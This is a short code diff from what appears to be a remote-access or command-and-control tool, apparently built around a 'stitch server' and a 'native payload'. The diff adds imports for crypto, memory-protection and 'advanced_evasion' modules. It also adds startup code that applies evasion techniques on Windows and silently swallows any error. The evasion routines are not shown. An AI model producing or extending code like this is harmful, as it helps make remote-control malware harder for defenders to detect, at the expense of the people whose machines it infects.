@@ -64,6 +64,10 @@ from native_protocol_bridge import native_bridge, send_command_to_native_payload
 from Core.elite_executor import EliteCommandExecutor
 # Import configuration system
 from Core.config import get_config, init_config
+# Import advanced security systems
+from Core.crypto_system import get_crypto, init_crypto
+from Core.memory_protection import get_memory_protection
+from Core.advanced_evasion import apply_evasions
 
 # ============================================================================
 # Configuration - Now loaded from Config module
@@ -105,6 +109,19 @@ def get_stitch_server():
 # ============================================================================
 elite_executor_instance = None
 executor_lock = threading.Lock()
+
+# Initialize advanced security systems
+try:
+    config = init_config()
+    crypto = init_crypto()
+    memory_protection = get_memory_protection()
+    
+    # Apply evasion techniques at startup (Windows only)
+    if sys.platform == 'win32':
+        from Core.advanced_evasion import apply_evasions
+        evasion_results = apply_evasions()
+except:
+    pass  # Silent fail for compatibility
 
 def get_elite_executor():
     """Get the shared elite command executor instance"""
